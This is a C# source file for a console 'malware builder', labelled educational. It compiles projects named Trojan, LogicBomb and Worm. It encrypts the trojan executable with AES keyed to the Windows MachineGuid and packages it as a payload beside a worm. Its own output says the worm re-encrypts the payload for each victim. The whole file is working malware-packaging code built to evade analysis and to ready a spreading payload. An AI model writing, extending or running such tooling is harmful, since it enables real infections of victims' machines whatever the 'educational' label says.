using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace Builder
{
    class Program
    {
        private static string SolutionDir;
        private static string BuilderOutputDir;
        private static string PayloadDir;

        private static string MachineGuid;

        static void Main(string[] args)
        {
            Console.WriteLine("===========================================");
            Console.WriteLine("   MALWARE BUILDER - EDUCATIONAL USE ONLY");
            Console.WriteLine("   Polymorphic Encryption Edition");
            Console.WriteLine("===========================================");
            Console.WriteLine();

            try
            {
                // Initialize paths
                InitializePaths();

                // Step 1: Get Machine GUID and derive keys
                GetMachineGuidAndDeriveKeys();

                // Step 2: Build Trojan
                BuildProject("Trojan");

                // Step 3: Encrypt Trojan.exe with machine-specific key
                EncryptTrojan();

                // Step 4: Build LogicBomb (with key derivation logic, no static keys)
                BuildProject("LogicBomb");

                // Step 5: Build Worm
                BuildProject("Worm");

                // Step 6: Create output structure
                CreateOutputStructure();

                // Step 7: Cleanup
                CleanupIntermediateFiles();

                Console.WriteLine();
                LogSuccess("Build completed successfully!");
                Console.WriteLine();
                LogInfo($"Output location: {BuilderOutputDir}");
                LogInfo("Structure:");
                LogInfo($"  product/");
                LogInfo($"    - Worm.exe");
                LogInfo($"    - payload/");
                LogInfo($"        - LogicBomb.exe");
                LogInfo($"        - bomb.encrypted");
                Console.WriteLine();
                LogWarning("Note: bomb.encrypted is encrypted with THIS machine's GUID.");
                LogWarning("Worm will re-encrypt for each victim with their specific GUID.");
            }
            catch (Exception ex)
            {
                Console.WriteLine();
                LogError("BUILD FAILED!");
                LogError($"Error: {ex.Message}");
                Console.WriteLine();
                LogError("Stack trace:");
                Console.WriteLine(ex.StackTrace);
                Environment.Exit(1);
            }

            Console.WriteLine();
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        private static void InitializePaths()
        {
            LogInfo("Initializing paths...");

            // Get solution directory (Builder's parent directory)
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            SolutionDir = Directory.GetParent(currentDir).Parent.Parent.Parent.FullName;

            // Create product folder for clean output
            BuilderOutputDir = Path.Combine(currentDir, "product");
            PayloadDir = Path.Combine(BuilderOutputDir, "payload");

            // Create directories
            Directory.CreateDirectory(BuilderOutputDir);
            Directory.CreateDirectory(PayloadDir);

            LogSuccess($"Solution directory: {SolutionDir}");
            LogSuccess($"Output directory: {BuilderOutputDir}");
            Console.WriteLine();
        }

        private static void GetMachineGuidAndDeriveKeys()
        {
            LogInfo("Retrieving Machine GUID for polymorphic encryption...");

            MachineGuid = CryptoUtils.GetMachineGuid();

            LogSuccess($"Machine GUID: {MachineGuid}");
            Console.WriteLine();

            LogInfo("Deriving encryption keys from Machine GUID...");
            CryptoUtils.LogDerivedKeys(MachineGuid);
            Console.WriteLine();
        }

        private static void BuildProject(string projectName)
        {
            LogInfo($"Building {projectName} project...");

            string projectPath = Path.Combine(SolutionDir, projectName, $"{projectName}.csproj");

            if (!File.Exists(projectPath))
            {
                throw new FileNotFoundException($"Project file not found: {projectPath}");
            }

            // Use dotnet build
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = $"build \"{projectPath}\" --configuration Debug",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    Console.WriteLine(output);
                    Console.WriteLine(error);
                    throw new Exception($"Failed to build {projectName}. Exit code: {process.ExitCode}");
                }
            }

            LogSuccess($"{projectName} built successfully");
            Console.WriteLine();
        }

        private static void EncryptTrojan()
        {
            LogInfo("Encrypting Trojan.exe with machine-specific key...");

            string trojanExePath = FindExecutable("Trojan", "Trojan.exe");

            LogInfo($"Found Trojan.exe at: {trojanExePath}");

            string encryptedOutputPath = Path.Combine(PayloadDir, "bomb.encrypted");

            // Encrypt using machine-specific key
            CryptoUtils.EncryptFile(trojanExePath, encryptedOutputPath, MachineGuid);

            FileInfo originalFile = new FileInfo(trojanExePath);
            FileInfo encryptedFile = new FileInfo(encryptedOutputPath);

            LogSuccess($"Trojan.exe encrypted successfully");
            LogSuccess($"Original size: {originalFile.Length} bytes");
            LogSuccess($"Encrypted size: {encryptedFile.Length} bytes");
            LogSuccess($"Output: {encryptedOutputPath}");
            Console.WriteLine();
        }

        private static void CreateOutputStructure()
        {
            LogInfo("Creating output structure in 'product' folder...");

            // Copy Worm.exe
            string wormSource = FindExecutable("Worm", "Worm.exe");
            string wormDest = Path.Combine(BuilderOutputDir, "Worm.exe");
            File.Copy(wormSource, wormDest, true);
            LogSuccess($"Copied Worm.exe to product folder");

            // Copy LogicBomb.exe
            string logicBombSource = FindExecutable("LogicBomb", "LogicBomb.exe");
            string logicBombDest = Path.Combine(PayloadDir, "LogicBomb.exe");
            File.Copy(logicBombSource, logicBombDest, true);
            LogSuccess($"Copied LogicBomb.exe to product/payload folder");

            // bomb.encrypted is already in payload folder from EncryptTrojan()
            LogSuccess("bomb.encrypted already in product/payload folder");

            Console.WriteLine();
        }

        private static string FindExecutable(string projectName, string exeName)
        {
            string[] possiblePaths = new[]
            {
                Path.Combine(SolutionDir, projectName, "bin", "Debug", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net472", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net48", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net6.0", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net7.0", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net8.0", exeName)
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path))
                {
                    return path;
                }
            }

            throw new FileNotFoundException($"{exeName} not found in any expected location for project {projectName}");
        }

        private static void CleanupIntermediateFiles()
        {
            LogInfo("Cleaning up intermediate files...");

            try
            {
                // Delete build outputs from Worm, LogicBomb, and Trojan bin folders
                string[] projectsToClean = { "Worm", "LogicBomb", "Trojan" };

                foreach (string project in projectsToClean)
                {
                    string binPath = Path.Combine(SolutionDir, project, "bin");
                    if (Directory.Exists(binPath))
                    {
                        Directory.Delete(binPath, true);
                        LogSuccess($"Cleaned {project}/bin folder");
                    }

                    string objPath = Path.Combine(SolutionDir, project, "obj");
                    if (Directory.Exists(objPath))
                    {
                        Directory.Delete(objPath, true);
                        LogSuccess($"Cleaned {project}/obj folder");
                    }
                }

                Console.WriteLine();
            }
            catch (Exception ex)
            {
                LogWarning($"Cleanup warning: {ex.Message}");
                LogWarning("Some files may still be in use. This is non-critical.");
                Console.WriteLine();
            }
        }

        // Logging helpers
        private static void LogInfo(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[INFO] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogSuccess(string message)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[SUCCESS] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogWarning(string message)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("[WARNING] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogError(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[ERROR] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }
    }

    // Embedded CryptoUtils class
    public static class CryptoUtils
    {
        private const string DEFAULT_MACHINE_ID = "DEFAULT_MACHINE_ID";
        private const string IV_SALT = "_IV_SALT_2025";

        public static string GetMachineGuid()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                {
                    if (key != null)
                    {
                        object guidValue = key.GetValue("MachineGuid");
                        if (guidValue != null)
                        {
                            string guid = guidValue.ToString();
                            if (!string.IsNullOrEmpty(guid))
                            {
                                return guid;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[CryptoUtils] Failed to read Machine GUID: {ex.Message}");
            }

            Console.WriteLine($"[CryptoUtils] Using fallback: {DEFAULT_MACHINE_ID}");
            return DEFAULT_MACHINE_ID;
        }

        public static byte[] DeriveKeyFromMachineId(string machineId)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId);
                byte[] hash = sha.ComputeHash(inputBytes);

                byte[] key = new byte[32];
                Array.Copy(hash, key, 32);

                return key;
            }
        }

        public static byte[] DeriveIVFromMachineId(string machineId)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId + IV_SALT);
                byte[] hash = sha.ComputeHash(inputBytes);

                byte[] iv = new byte[16];
                Array.Copy(hash, iv, 16);

                return iv;
            }
        }

        public static void EncryptFile(string inputFile, string outputFile, string machineId)
        {
            byte[] key = DeriveKeyFromMachineId(machineId);
            byte[] iv = DeriveIVFromMachineId(machineId);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    fsInput.CopyTo(cs);
                }
            }
        }

        public static void LogDerivedKeys(string machineId)
        {
            byte[] key = DeriveKeyFromMachineId(machineId);
            byte[] iv = DeriveIVFromMachineId(machineId);

            Console.WriteLine($"[CryptoUtils] Derived Key: {BitConverter.ToString(key).Replace("-", "").Substring(0, 32)}...");
            Console.WriteLine($"[CryptoUtils] Derived IV:  {BitConverter.ToString(iv).Replace("-", "")}");
        }
    }
}